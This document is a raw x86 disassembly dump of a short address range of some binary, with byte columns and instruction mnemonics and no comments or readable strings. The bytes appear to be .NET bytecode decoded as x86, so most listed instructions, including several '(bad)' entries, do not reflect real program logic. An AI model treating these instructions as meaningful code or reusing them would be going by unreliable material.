  40472c:	3a 9d 11 07 6f 67    	cmp    0x676f0711(%ebp),%bl
  404732:	00 00                	add    %al,(%eax)
  404734:	0a 16                	or     (%esi),%dl
  404736:	9a 7d 3a 00 00 04 06 	lcall  $0x604,$0x3a7d
  40473d:	02 17                	add    (%edi),%dl
  40473f:	8d 49 00             	lea    0x0(%ecx),%ecx
  404742:	00 01                	add    %al,(%ecx)
  404744:	13 07                	adc    (%edi),%eax
  404746:	11 07                	adc    %eax,(%edi)
  404748:	16                   	push   %ss
  404749:	1f                   	pop    %ds
  40474a:	3a 9d 11 07 6f 67    	cmp    0x676f0711(%ebp),%bl
  404750:	00 00                	add    %al,(%eax)
  404752:	0a 17                	or     (%edi),%dl
  404754:	9a 7d 3b 00 00 04 02 	lcall  $0x204,$0x3b7d
  40475b:	17                   	pop    %ss
  40475c:	8d 49 00             	lea    0x0(%ecx),%ecx
  40475f:	00 01                	add    %al,(%ecx)
  404761:	13 07                	adc    (%edi),%eax
  404763:	11 07                	adc    %eax,(%edi)
  404765:	16                   	push   %ss
  404766:	1f                   	pop    %ds
  404767:	3a 9d 11 07 6f 67    	cmp    0x676f0711(%ebp),%bl
  40476d:	00 00                	add    %al,(%eax)
  40476f:	0a 18                	or     (%eax),%bl
  404771:	9a 28 d9 00 00 0a 1f 	lcall  $0x1f0a,$0xd928
  404778:	3c d8                	cmp    $0xd8,%al
  40477a:	0c 08                	or     $0x8,%al
  40477c:	6c                   	insb   (%dx),%es:(%edi)
  40477d:	28 dc                	sub    %bl,%ah
  40477f:	00 00                	add    %al,(%eax)
  404781:	0a 0d 73 dd 00 00    	or     0xdd73,%cl
  404787:	0a 0b                	or     (%ebx),%cl
  404789:	07                   	pop    %es
  40478a:	6f                   	outsl  %ds:(%esi),(%dx)
  40478b:	de 00                	fiadds (%eax)
  40478d:	00 0a                	add    %cl,(%edx)
  40478f:	2b 34 16             	sub    (%esi,%edx,1),%esi
  404792:	13 05 06 25 fe 07    	adc    0x7fe2506,%eax
  404798:	81 00 00 06 73 46    	addl   $0x46730600,(%eax)
  40479e:	00 00                	add    %al,(%eax)
  4047a0:	0a 73 47             	or     0x47(%ebx),%dh
  4047a3:	00 00                	add    %al,(%eax)
  4047a5:	0a 13                	or     (%ebx),%dl
  4047a7:	04 11                	add    $0x11,%al
  4047a9:	04 6f                	add    $0x6f,%al
  4047ab:	48                   	dec    %eax
  4047ac:	00 00                	add    %al,(%eax)
  4047ae:	0a 11                	or     (%ecx),%dl
  4047b0:	05 17 d6 13 05       	add    $0x513d617,%eax
  4047b5:	11 05 1f 13 31 d9    	adc    %eax,0xd931131f
  4047bb:	20 88 13 00 00 28    	and    %cl,0x28000013(%eax)
  4047c1:	22 00                	and    (%eax),%al
  4047c3:	00 0a                	add    %cl,(%edx)
  4047c5:	09 07                	or     %eax,(%edi)
  4047c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4047c8:	df 00                	filds  (%eax)
  4047ca:	00 0a                	add    %cl,(%edx)
  4047cc:	28 e0                	sub    %ah,%al
  4047ce:	00 00                	add    %al,(%eax)
  4047d0:	0a 2c 07             	or     (%edi,%eax,1),%ch
  4047d3:	7e 12                	jle    0x4047e7
  4047d5:	00 00                	add    %al,(%eax)
  4047d7:	04 2d                	add    $0x2d,%al
  4047d9:	b7 de                	mov    $0xde,%bh
  4047db:	0f 25                	(bad)
  4047dd:	28 25 00 00 0a 13    	sub    %ah,0x130a0000
  4047e3:	06                   	push   %es
  4047e4:	28 27                	sub    %ah,(%edi)
  4047e6:	00 00                	add    %al,(%eax)
  4047e8:	0a de                	or     %dh,%bl
  4047ea:	00 2a                	add    %ch,(%edx)
  4047ec:	01 10                	add    %edx,(%eax)
  4047ee:	00 00                	add    %al,(%eax)
  4047f0:	00 00                	add    %al,(%eax)
  4047f2:	00 00                	add    %al,(%eax)
  4047f4:	c4                   	(bad)
  4047f5:	c4 00                	les    (%eax),%eax
  4047f7:	0f 29 00             	movaps %xmm0,(%eax)
  4047fa:	00 01                	add    %al,(%ecx)
  4047fc:	13 30                	adc    (%eax),%esi
  4047fe:	08 00                	or     %al,(%eax)
  404800:	e3 00                	jecxz  0x404802
  404802:	00 00                	add    %al,(%eax)
  404804:	28 00                	sub    %al,(%eax)
  404806:	00 11                	add    %dl,(%ecx)
  404808:	73 e1                	jae    0x4047eb
  40480a:	00 00                	add    %al,(%eax)
  40480c:	0a 0c 02             	or     (%edx,%eax,1),%cl
  40480f:	72 4b                	jb     0x40485c
  404811:	07                   	pop    %es
  404812:	00 70 15             	add    %dh,0x15(%eax)
  404815:	16                   	push   %ss
  404816:	28 af 00 00 0a 13    	sub    %ch,0x130a0000(%edi)
  40481c:	05 16 13 04 2b       	add    $0x2b041316,%eax
  404821:	2c 11                	sub    $0x11,%al
  404823:	05 11 04 9a 0b       	add    $0xb9a0411,%eax
  404828:	08 07                	or     %al,(%edi)
  40482a:	14 72                	adc    $0x72,%al
  40482c:	cf                   	iret
  40482d:	0b 00                	or     (%eax),%eax
  40482f:	70 16                	jo     0x404847
  404831:	8d 03                	lea    (%ebx),%eax
  404833:	00 00                	add    %al,(%eax)
  404835:	01 14 14             	add    %edx,(%esp,%edx,1)
  404838:	14 28                	adc    $0x28,%al
  40483a:	41                   	inc    %ecx
  40483b:	00 00                	add    %al,(%eax)
  40483d:	0a 28                	or     (%eax),%ch
  40483f:	23 00                	and    (%eax),%eax
  404841:	00 0a                	add    %cl,(%edx)
  404843:	6f                   	outsl  %ds:(%esi),(%dx)
  404844:	e2 00                	loop   0x404846
  404846:	00 0a                	add    %cl,(%edx)
  404848:	11 04 17             	adc    %eax,(%edi,%edx,1)
  40484b:	d6                   	salc
  40484c:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40484f:	04 11                	add    $0x11,%al
  404851:	05 8e b7 32 cc       	add    $0xcc32b78e,%eax
  404856:	1f                   	pop    %ds
  404857:	1e                   	push   %ds
  404858:	0a 38                	or     (%eax),%bh
  40485a:	82 00 00             	addb   $0x0,(%eax)
  40485d:	00 28                	add    %ch,(%eax)
  40485f:	e3 00                	jecxz  0x404861
  404861:	00 0a                	add    %cl,(%edx)
  404863:	13 07                	adc    (%edi),%eax
  404865:	16                   	push   %ss
  404866:	13 06                	adc    (%esi),%eax
  404868:	2b 60 11             	sub    0x11(%eax),%esp
  40486b:	07                   	pop    %es
  40486c:	11 06                	adc    %eax,(%esi)
  40486e:	9a 0d 09 6f e4 00 00 	lcall  $0x0,$0xe46f090d
  404875:	0a 28                	or     (%eax),%ch
  404877:	e5 00                	in     $0x0,%eax
  404879:	00 0a                	add    %cl,(%edx)
  40487b:	2c 02                	sub    $0x2,%al
  40487d:	2b 45 08             	sub    0x8(%ebp),%eax
  404880:	09 6f e4             	or     %ebp,-0x1c(%edi)
  404883:	00 00                	add    %al,(%eax)
  404885:	0a 6f 56             	or     0x56(%edi),%ch
  404888:	00 00                	add    %al,(%eax)
  40488a:	0a 25 fe 07 53 00    	or     0x5307fe,%ah
  404890:	00 0a                	add    %cl,(%edx)
  404892:	73 e6                	jae    0x40487a
  404894:	00 00                	add    %al,(%eax)
  404896:	0a 28                	or     (%eax),%ch
  404898:	03 00                	add    (%eax),%eax
  40489a:	00 2b                	add    %ch,(%ebx)
  40489c:	2c 26                	sub    $0x26,%al
  40489e:	06                   	push   %es
  40489f:	1f                   	pop    %ds
  4048a0:	1e                   	push   %ds
  4048a1:	31 21                	xor    %esp,(%ecx)
  4048a3:	16                   	push   %ss
  4048a4:	0a 72 df             	or     -0x21(%edx),%dh
  4048a7:	0b 00                	or     (%eax),%eax
  4048a9:	70 09                	jo     0x4048b4
  4048ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4048ac:	e4 00                	in     $0x0,%al
  4048ae:	00 0a                	add    %cl,(%edx)
  4048b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4048b1:	56                   	push   %esi
  4048b2:	00 00                	add    %al,(%eax)
  4048b4:	0a 72 ed             	or     -0x13(%edx),%dh
  4048b7:	0b 00                	or     (%eax),%eax
  4048b9:	70 28                	jo     0x4048e3
  4048bb:	28 00                	sub    %al,(%eax)
  4048bd:	00 0a                	add    %cl,(%edx)
  4048bf:	28 39                	sub    %bh,(%ecx)
  4048c1:	00 00                	add    %al,(%eax)
  4048c3:	06                   	push   %es
  4048c4:	11 06                	adc    %eax,(%esi)
  4048c6:	17                   	pop    %ss
  4048c7:	d6                   	salc
  4048c8:	13 06                	adc    (%esi),%eax
  4048ca:	11 06                	adc    %eax,(%esi)
  4048cc:	11 07                	adc    %eax,(%edi)
  4048ce:	8e b7 32 98 06 17    	mov    0x17069832(%edi),%?
  4048d4:	d6                   	salc
  4048d5:	0a 20                	or     (%eax),%ah
  4048d7:	e8 03 00 00 28       	call   0x284048df
  4048dc:	22 00                	and    (%eax),%al
  4048de:	00 0a                	add    %cl,(%edx)
  4048e0:	7e 12                	jle    0x4048f4
  4048e2:	00 00                	add    %al,(%eax)
  4048e4:	04 3a                	add    $0x3a,%al
  4048e6:	74 ff                	je     0x4048e7
  4048e8:	ff                   	(bad)
  4048e9:	ff 2a                	ljmp   *(%edx)
  4048eb:	00 1b                	add    %bl,(%ebx)
  4048ed:	30 04 00             	xor    %al,(%eax,%eax,1)
  4048f0:	96                   	xchg   %eax,%esi
  4048f1:	00 00                	add    %al,(%eax)
  4048f3:	00 29                	add    %ch,(%ecx)
  4048f5:	00 00                	add    %al,(%eax)
  4048f7:	11 03                	adc    %eax,(%ebx)
  4048f9:	39 88 00 00 00 17    	cmp    %ecx,0x17000000(%eax)
  4048ff:	28 b3 00 00 0a 20    	sub    %dh,0x200a0000(%ebx)
  404905:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404908:	00 28                	add    %ch,(%eax)
  40490a:	b4 00                	mov    $0x0,%ah
  40490c:	00 0a                	add    %cl,(%edx)
  40490e:	20 0f                	and    %cl,(%edi)
  404910:	27                   	daa
  404911:	00 00                	add    %al,(%eax)
  404913:	28 b5 00 00 0a de    	sub    %dh,-0x21f60000(%ebp)
  404919:	0c 28                	or     $0x28,%al
  40491b:	25 00 00 0a 28       	and    $0x280a0000,%eax
  404920:	27                   	daa
  404921:	00 00                	add    %al,(%eax)
  404923:	0a de                	or     %dh,%bl
  404925:	00 02                	add    %al,(%edx)
  404927:	28 e8                	sub    %ch,%al
  404929:	00 00                	add    %al,(%eax)
  40492b:	0a 74 83 00          	or     0x0(%ebx,%eax,4),%dh
  40492f:	00 01                	add    %al,(%ecx)
  404931:	0a 06                	or     (%esi),%al
  404933:	7e 32                	jle    0x404967
  404935:	00 00                	add    %al,(%eax)
  404937:	04 73                	add    $0x73,%al
  404939:	61                   	popa
  40493a:	00 00                	add    %al,(%eax)
  40493c:	0a 7e 32             	or     0x32(%esi),%bh
  40493f:	00 00                	add    %al,(%eax)
  404941:	04 8e                	add    $0x8e,%al
  404943:	b7 6f                	mov    $0x6f,%bh
  404945:	68 00 00 0a 9a       	push   $0x9a0a0000
  40494a:	6f                   	outsl  %ds:(%esi),(%dx)
  40494b:	e9 00 00 0a 06       	jmp    0x64a4950
  404950:	17                   	pop    %ss
  404951:	6f                   	outsl  %ds:(%esi),(%dx)
  404952:	ea 00 00 0a 06 20 10 	ljmp   $0x1020,$0x60a0000
  404959:	27                   	daa
  40495a:	00 00                	add    %al,(%eax)
  40495c:	6f                   	outsl  %ds:(%esi),(%dx)
  40495d:	eb 00                	jmp    0x40495f
  40495f:	00 0a                	add    %cl,(%edx)
  404961:	06                   	push   %es
  404962:	72 f1                	jb     0x404955
  404964:	0b 00                	or     (%eax),%eax
  404966:	70 6f                	jo     0x4049d7
  404968:	ec                   	in     (%dx),%al
  404969:	00 00                	add    %al,(%eax)
  40496b:	0a 06                	or     (%esi),%al
  40496d:	6f                   	outsl  %ds:(%esi),(%dx)
  40496e:	ed                   	in     (%dx),%eax
  40496f:	00 00                	add    %al,(%eax)
  404971:	0a 74 84 00          	or     0x0(%esp,%eax,4),%dh
  404975:	00 01                	add    %al,(%ecx)
  404977:	0b de                	or     %esi,%ebx
  404979:	0a 07                	or     (%edi),%al
  40497b:	2c 06                	sub    $0x6,%al
  40497d:	07                   	pop    %es
  40497e:	6f                   	outsl  %ds:(%esi),(%dx)
  40497f:	5e                   	pop    %esi
  404980:	00 00                	add    %al,(%eax)
  404982:	0a dc                	or     %ah,%bl
  404984:	2b 07                	sub    (%edi),%eax
  404986:	02 28                	add    (%eax),%ch
  404988:	b9 00 00 0a 26       	mov    $0x260a0000,%ecx
  40498d:	2a 00                	sub    (%eax),%al
  40498f:	00 01                	add    %al,(%ecx)
  404991:	1c 00                	sbb    $0x0,%al
  404993:	00 00                	add    %al,(%eax)
  404995:	00 06                	add    %al,(%esi)
  404997:	00 1c 22             	add    %bl,(%edx,%eiz,1)
  40499a:	00 0c 29             	add    %cl,(%ecx,%ebp,1)
  40499d:	00 00                	add    %al,(%eax)
  40499f:	01 02                	add    %eax,(%edx)
  4049a1:	00 80 00 02 82 00    	add    %al,0x820200(%eax)
  4049a7:	0a 00                	or     (%eax),%al
  4049a9:	00 00                	add    %al,(%eax)
  4049ab:	00 1b                	add    %bl,(%ebx)
  4049ad:	30 05 00 40 00 00    	xor    %al,0x4000
  4049b3:	00 2a                	add    %ch,(%edx)
  4049b5:	00 00                	add    %al,(%eax)
  4049b7:	11 16                	adc    %edx,(%esi)
  4049b9:	0b 14 0c             	or     (%esp,%ecx,1),%edx
  4049bc:	07                   	pop    %es
  4049bd:	b5 1f                	mov    $0x1f,%ch
  4049bf:	64 28 ee             	fs sub %ch,%dh
  4049c2:	00 00                	add    %al,(%eax)
  4049c4:	0a 13                	or     (%ebx),%dl
  4049c6:	04 12                	add    $0x12,%al
  4049c8:	04 1f                	add    $0x1f,%al
  4049ca:	64 12 02             	adc    %fs:(%edx),%al
  4049cd:	1f                   	pop    %ds
  4049ce:	64 28 3f             	sub    %bh,%fs:(%edi)
  4049d1:	00 00                	add    %al,(%eax)
  4049d3:	06                   	push   %es
  4049d4:	2c 04                	sub    $0x4,%al
  4049d6:	17                   	pop    %ss
  4049d7:	0a de                	or     %dh,%bl
  4049d9:	1c 07                	sbb    $0x7,%al
  4049db:	17                   	pop    %ss
  4049dc:	d6                   	salc
  4049dd:	0b 07                	or     (%edi),%eax
  4049df:	1a 31                	sbb    (%ecx),%dh
  4049e1:	d8 de                	fcomp  %st(6)
  4049e3:	0e                   	push   %cs
  4049e4:	25 28 25 00 00       	and    $0x2528,%eax
  4049e9:	0a 0d 28 27 00 00    	or     0x2728,%cl
  4049ef:	0a de                	or     %dh,%bl
  4049f1:	00 16                	add    %dl,(%esi)
  4049f3:	0a 2b                	or     (%ebx),%ch
  4049f5:	00 06                	add    %al,(%esi)
  4049f7:	2a 01                	sub    (%ecx),%al
  4049f9:	10 00                	adc    %al,(%eax)
  4049fb:	00 00                	add    %al,(%eax)
  4049fd:	00 00                	add    %al,(%eax)
  4049ff:	00 2c 2c             	add    %ch,(%esp,%ebp,1)
  404a02:	00 0e                	add    %cl,(%esi)
  404a04:	29 00                	sub    %eax,(%eax)
  404a06:	00 01                	add    %al,(%ecx)
  404a08:	13 30                	adc    (%eax),%esi
  404a0a:	09 00                	or     %eax,(%eax)
  404a0c:	c8 00 00 00          	enter  $0x0,$0x0
  404a10:	2b 00                	sub    (%eax),%eax
  404a12:	00 11                	add    %dl,(%ecx)
  404a14:	28 b6 00 00 0a 1c    	sub    %dh,0x1c0a0000(%esi)
  404a1a:	28 63 00             	sub    %ah,0x0(%ebx)
  404a1d:	00 06                	add    %al,(%esi)
  404a1f:	02 28                	add    (%eax),%ch
  404a21:	1f                   	pop    %ds
  404a22:	00 00                	add    %al,(%eax)
  404a24:	0a 28                	or     (%eax),%ch
  404a26:	b7 00                	mov    $0x0,%bh
  404a28:	00 0a                	add    %cl,(%edx)
  404a2a:	0a 06                	or     (%esi),%al
  404a2c:	28 23                	sub    %ah,(%ebx)
  404a2e:	00 00                	add    %al,(%eax)
  404a30:	0a 03                	or     (%ebx),%al
  404a32:	28 31                	sub    %dh,(%ecx)
  404a34:	00 00                	add    %al,(%eax)
  404a36:	0a 20                	or     (%eax),%ah
  404a38:	f4                   	hlt
  404a39:	01 00                	add    %eax,(%eax)
  404a3b:	00 28                	add    %ch,(%eax)
  404a3d:	22 00                	and    (%eax),%al
  404a3f:	00 0a                	add    %cl,(%edx)
  404a41:	02 6f 56             	add    0x56(%edi),%ch
  404a44:	00 00                	add    %al,(%eax)
  404a46:	0a 72 f9             	or     -0x7(%edx),%dh
  404a49:	0b 00                	or     (%eax),%eax
  404a4b:	70 6f                	jo     0x404abc
  404a4d:	ef                   	out    %eax,(%dx)
  404a4e:	00 00                	add    %al,(%eax)
  404a50:	0a 2c 3b             	or     (%ebx,%edi,1),%ch
  404a53:	72 d9                	jb     0x404a2e
  404a55:	03 00                	add    (%eax),%eax
  404a57:	70 73                	jo     0x404acc
  404a59:	32 00                	xor    (%eax),%al
  404a5b:	00 0a                	add    %cl,(%edx)
  404a5d:	0c 08                	or     $0x8,%al
  404a5f:	17                   	pop    %ss
  404a60:	6f                   	outsl  %ds:(%esi),(%dx)
  404a61:	33 00                	xor    (%eax),%eax
  404a63:	00 0a                	add    %cl,(%edx)
  404a65:	08 72 03             	or     %dh,0x3(%edx)
  404a68:	0c 00                	or     $0x0,%al
  404a6a:	70 06                	jo     0x404a72
  404a6c:	28 91 00 00 0a 72    	sub    %dl,0x720a0000(%ecx)
  404a72:	ad                   	lods   %ds:(%esi),%eax
  404a73:	02 00                	add    (%eax),%al
  404a75:	70 28                	jo     0x404a9f
  404a77:	91                   	xchg   %eax,%ecx
  404a78:	00 00                	add    %al,(%eax)
  404a7a:	0a 28                	or     (%eax),%ch
  404a7c:	23 00                	and    (%eax),%eax
  404a7e:	00 0a                	add    %cl,(%edx)
  404a80:	6f                   	outsl  %ds:(%esi),(%dx)
  404a81:	37                   	aaa
  404a82:	00 00                	add    %al,(%eax)
  404a84:	0a 08                	or     (%eax),%cl
  404a86:	28 38                	sub    %bh,(%eax)
  404a88:	00 00                	add    %al,(%eax)
  404a8a:	0a 0b                	or     (%ebx),%cl
  404a8c:	2b 4d 14             	sub    0x14(%ebp),%ecx
  404a8f:	d0 2b                	shrb   $1,(%ebx)
  404a91:	00 00                	add    %al,(%eax)
  404a93:	01 28                	add    %ebp,(%eax)
  404a95:	14 00                	adc    $0x0,%al
  404a97:	00 0a                	add    %cl,(%edx)
  404a99:	72 1d                	jb     0x404ab8
  404a9b:	08 00                	or     %al,(%eax)
  404a9d:	70 17                	jo     0x404ab6
  404a9f:	8d 03                	lea    (%ebx),%eax
  404aa1:	00 00                	add    %al,(%eax)
  404aa3:	01 0d 09 16 06 28    	add    %ecx,0x28061609
  404aa9:	11 00                	adc    %eax,(%eax)
  404aab:	00 0a                	add    %cl,(%edx)
  404aad:	a2 09 13 04 11       	mov    %al,0x11041309
  404ab2:	04 14                	add    $0x14,%al
  404ab4:	14 17                	adc    $0x17,%al
  404ab6:	8d 38                	lea    (%eax),%edi
  404ab8:	00 00                	add    %al,(%eax)
  404aba:	01 13                	add    %edx,(%ebx)
  404abc:	05 11 05 16 17       	add    $0x17160511,%eax
  404ac1:	9c                   	pushf
  404ac2:	11 05 17 28 44 00    	adc    %eax,0x442817
  404ac8:	00 0a                	add    %cl,(%edx)
  404aca:	26 11 05 16 90 2c 0a 	adc    %eax,%es:0xa2c9016
  404ad1:	11 04 16             	adc    %eax,(%esi,%edx,1)
  404ad4:	9a 28 11 00 00 0a 0a 	lcall  $0xa0a,$0x1128
  404adb:	2a 1b                	sub    (%ebx),%bl
  404add:	30 03                	xor    %al,(%ebx)
  404adf:	00 5d 00             	add    %bl,0x0(%ebp)
  404ae2:	00 00                	add    %al,(%eax)
  404ae4:	2c 00                	sub    $0x0,%al
  404ae6:	00 11                	add    %dl,(%ecx)
  404ae8:	28 d3                	sub    %dl,%bl
  404aea:	00 00                	add    %al,(%eax)
  404aec:	0a 02                	or     (%edx),%al
  404aee:	6f                   	outsl  %ds:(%esi),(%dx)
  404aef:	d4 00                	aam    $0x0
  404af1:	00 0a                	add    %cl,(%edx)
  404af3:	0b 07                	or     (%edi),%eax
  404af5:	6f                   	outsl  %ds:(%esi),(%dx)
  404af6:	f0 00 00             	lock add %al,(%eax)
  404af9:	0a 0d 07 09 6f d6    	or     0xd66f0907,%cl
  404aff:	00 00                	add    %al,(%eax)
  404b01:	0a 6f f1             	or     -0xf(%edi),%ch
  404b04:	00 00                	add    %al,(%eax)
  404b06:	0a 28                	or     (%eax),%ch
  404b08:	11 00                	adc    %eax,(%eax)
  404b0a:	00 0a                	add    %cl,(%edx)
  404b0c:	0c 17                	or     $0x17,%al
  404b0e:	8d 03                	lea    (%ebx),%eax
  404b10:	00 00                	add    %al,(%eax)
  404b12:	01 13                	add    %edx,(%ebx)
  404b14:	04 09                	add    $0x9,%al
  404b16:	6f                   	outsl  %ds:(%esi),(%dx)
  404b17:	f2 00 00             	repnz add %al,(%eax)
  404b1a:	0a 8e b7 16 33 03    	or     0x33316b7(%esi),%cl
  404b20:	14 13                	adc    $0x13,%al
  404b22:	04 09                	add    $0x9,%al
  404b24:	08 28                	or     %ch,(%eax)
  404b26:	11 00                	adc    %eax,(%eax)
  404b28:	00 0a                	add    %cl,(%edx)
  404b2a:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  404b2d:	f3 00 00             	repz add %al,(%eax)
  404b30:	0a 26                	or     (%esi),%ah
  404b32:	de 0f                	fimuls (%edi)
  404b34:	25 28 25 00 00       	and    $0x2528,%eax
  404b39:	0a 13                	or     (%ebx),%dl
  404b3b:	05 28 27 00 00       	add    $0x2728,%eax
  404b40:	0a de                	or     %dh,%bl
  404b42:	00 06                	add    %al,(%esi)
  404b44:	2a 00                	sub    (%eax),%al
  404b46:	00 00                	add    %al,(%eax)
  404b48:	01 10                	add    %edx,(%eax)
  404b4a:	00 00                	add    %al,(%eax)
  404b4c:	00 00                	add    %al,(%eax)
  404b4e:	00 00                	add    %al,(%eax)
  404b50:	4c                   	dec    %esp
  404b51:	4c                   	dec    %esp
  404b52:	00 0f                	add    %cl,(%edi)
  404b54:	29 00                	sub    %eax,(%eax)
  404b56:	00 01                	add    %al,(%ecx)
  404b58:	3a 02                	cmp    (%edx),%al
  404b5a:	28 23                	sub    %ah,(%ebx)
  404b5c:	00 00                	add    %al,(%eax)
  404b5e:	0a 28                	or     (%eax),%ch
  404b60:	3b 00                	cmp    (%eax),%eax
  404b62:	00 06                	add    %al,(%esi)
  404b64:	2b 00                	sub    (%eax),%eax
  404b66:	2a 00                	sub    (%eax),%al
  404b68:	3a 02                	cmp    (%edx),%al
  404b6a:	28 23                	sub    %ah,(%ebx)
  404b6c:	00 00                	add    %al,(%eax)
  404b6e:	0a 28                	or     (%eax),%ch
  404b70:	3c 00                	cmp    $0x0,%al
  404b72:	00 06                	add    %al,(%esi)
  404b74:	2b 00                	sub    (%eax),%eax
  404b76:	2a 00                	sub    (%eax),%al
  404b78:	1b 30                	sbb    (%eax),%esi
  404b7a:	05 00 aa 00 00       	add    $0xaa00,%eax
  404b7f:	00 2d 00 00 11 18    	add    %ch,0x18110000
  404b85:	17                   	pop    %ss
  404b86:	1c 73                	sbb    $0x73,%al
  404b88:	6b 00 00             	imul   $0x0,(%eax),%eax
  404b8b:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404b8e:	02 7b 3a             	add    0x3a(%ebx),%bh
  404b91:	00 00                	add    %al,(%eax)
  404b93:	04 02                	add    $0x2,%al
  404b95:	7b 3b                	jnp    0x404bd2
  404b97:	00 00                	add    %al,(%eax)
  404b99:	04 28                	add    $0x28,%al
  404b9b:	d9 00                	flds   (%eax)
  404b9d:	00 0a                	add    %cl,(%edx)
  404b9f:	6f                   	outsl  %ds:(%esi),(%dx)
  404ba0:	6f                   	outsl  %ds:(%esi),(%dx)
  404ba1:	00 00                	add    %al,(%eax)
  404ba3:	0a 1b                	or     (%ebx),%bl
  404ba5:	8d 26                	lea    (%esi),%esp
  404ba7:	00 00                	add    %al,(%eax)
  404ba9:	01 13                	add    %edx,(%ebx)
  404bab:	04 11                	add    $0x11,%al
  404bad:	04 16                	add    $0x16,%al
  404baf:	72 43                	jb     0x404bf4
  404bb1:	0c 00                	or     $0x0,%al
  404bb3:	70 a2                	jo     0x404b57
  404bb5:	11 04 17             	adc    %eax,(%edi,%edx,1)
  404bb8:	02 7b 3a             	add    0x3a(%ebx),%bh
  404bbb:	00 00                	add    %al,(%eax)
  404bbd:	04 a2                	add    $0xa2,%al
  404bbf:	11 04 18             	adc    %eax,(%eax,%ebx,1)
  404bc2:	72 73                	jb     0x404c37
  404bc4:	0c 00                	or     $0x0,%al
  404bc6:	70 a2                	jo     0x404b6a
  404bc8:	11 04 19             	adc    %eax,(%ecx,%ebx,1)
  404bcb:	7e 32                	jle    0x404bff
  404bcd:	00 00                	add    %al,(%eax)
  404bcf:	04 73                	add    $0x73,%al
  404bd1:	61                   	popa
  404bd2:	00 00                	add    %al,(%eax)
  404bd4:	0a 7e 32             	or     0x32(%esi),%bh
  404bd7:	00 00                	add    %al,(%eax)
  404bd9:	04 8e                	add    $0x8e,%al
  404bdb:	b7 6f                	mov    $0x6f,%bh
  404bdd:	68 00 00 0a 9a       	push   $0x9a0a0000
  404be2:	a2 11 04 1a 72       	mov    %al,0x721a0411
  404be7:	24 0d                	and    $0xd,%al
  404be9:	00 70 a2             	add    %dh,-0x5e(%eax)
  404bec:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  404bef:	36 00 00             	add    %al,%ss:(%eax)
  404bf2:	0a 0b                	or     (%ebx),%cl
  404bf4:	28 f4                	sub    %dh,%ah
  404bf6:	00 00                	add    %al,(%eax)
  404bf8:	0a 07                	or     (%edi),%al
  404bfa:	6f                   	outsl  %ds:(%esi),(%dx)
  404bfb:	f5                   	cmc
  404bfc:	00 00                	add    %al,(%eax)
  404bfe:	0a 0a                	or     (%edx),%cl
  404c00:	08 06                	or     %al,(%esi)
  404c02:	16                   	push   %ss
  404c03:	06                   	push   %es
  404c04:	8e b7 16 6f f6 00    	mov    0xf66f16(%edi),%?
  404c0a:	00 0a                	add    %cl,(%edx)
  404c0c:	26 20 c4             	es and %al,%ah
  404c0f:	09 00                	or     %eax,(%eax)
  404c11:	00 28                	add    %ch,(%eax)
  404c13:	22 00                	and    (%eax),%al
  404c15:	00 0a                	add    %cl,(%edx)
  404c17:	08 6f ad             	or     %ch,-0x53(%edi)
  404c1a:	00 00                	add    %al,(%eax)
  404c1c:	0a de                	or     %dh,%bl
  404c1e:	0e                   	push   %cs
  404c1f:	25 28 25 00 00       	and    $0x2528,%eax
  404c24:	0a 0d 28 27 00 00    	or     0x2728,%cl
  404c2a:	0a de                	or     %dh,%bl
  404c2c:	00 2a                	add    %ch,(%edx)
  404c2e:	00 00                	add    %al,(%eax)
  404c30:	01 10                	add    %edx,(%eax)
  404c32:	00 00                	add    %al,(%eax)
  404c34:	00 00                	add    %al,(%eax)
  404c36:	00 00                	add    %al,(%eax)
  404c38:	9b                   	fwait
  404c39:	9b                   	fwait
  404c3a:	00 0e                	add    %cl,(%esi)
  404c3c:	29 00                	sub    %eax,(%eax)
  404c3e:	00 01                	add    %al,(%ecx)
  404c40:	1e                   	push   %ds
  404c41:	02 28                	add    (%eax),%ch
  404c43:	17                   	pop    %ss
  404c44:	00 00                	add    %al,(%eax)
  404c46:	0a 2a                	or     (%edx),%ch
  404c48:	1e                   	push   %ds
  404c49:	02 28                	add    (%eax),%ch
  404c4b:	17                   	pop    %ss
  404c4c:	00 00                	add    %al,(%eax)
  404c4e:	0a 2a                	or     (%edx),%ch
  404c50:	1b 30                	sbb    (%eax),%esi
  404c52:	04 00                	add    $0x0,%al
  404c54:	4b                   	dec    %ebx
  404c55:	02 00                	add    (%eax),%al
  404c57:	00 2e                	add    %ch,(%esi)
  404c59:	00 00                	add    %al,(%eax)
  404c5b:	11 02                	adc    %eax,(%edx)
  404c5d:	2c 2f                	sub    $0x2f,%al
  404c5f:	28 b6 00 00 0a 1c    	sub    %dh,0x1c0a0000(%esi)
  404c65:	28 63 00             	sub    %ah,0x0(%ebx)
  404c68:	00 06                	add    %al,(%esi)
  404c6a:	03 28                	add    (%eax),%ebp
  404c6c:	1f                   	pop    %ds
  404c6d:	00 00                	add    %al,(%eax)
  404c6f:	0a 28                	or     (%eax),%ch
  404c71:	b7 00                	mov    $0x0,%bh
  404c73:	00 0a                	add    %cl,(%edx)
  404c75:	10 01                	adc    %al,(%ecx)
  404c77:	03 04 28             	add    (%eax,%ebp,1),%eax
  404c7a:	31 00                	xor    %eax,(%eax)
  404c7c:	00 0a                	add    %cl,(%edx)
  404c7e:	de 0e                	fimuls (%esi)
  404c80:	25 28 25 00 00       	and    $0x2528,%eax
  404c85:	0a 0a                	or     (%edx),%cl
  404c87:	28 27                	sub    %ah,(%edi)
  404c89:	00 00                	add    %al,(%eax)
  404c8b:	0a de                	or     %dh,%bl
  404c8d:	00 7e 0e             	add    %bh,0xe(%esi)
  404c90:	00 00                	add    %al,(%eax)
  404c92:	04 72                	add    $0x72,%al
  404c94:	23 02                	and    (%edx),%eax
  404c96:	00 70 7e             	add    %dh,0x7e(%eax)
  404c99:	0f 00 00             	sldt   (%eax)
  404c9c:	04 28                	add    $0x28,%al
  404c9e:	28 00                	sub    %al,(%eax)
  404ca0:	00 0a                	add    %cl,(%edx)
  404ca2:	28 f8                	sub    %bh,%al
  404ca4:	00 00                	add    %al,(%eax)
  404ca6:	0a de                	or     %dh,%bl
  404ca8:	0e                   	push   %cs
  404ca9:	25 28 25 00 00       	and    $0x2528,%eax
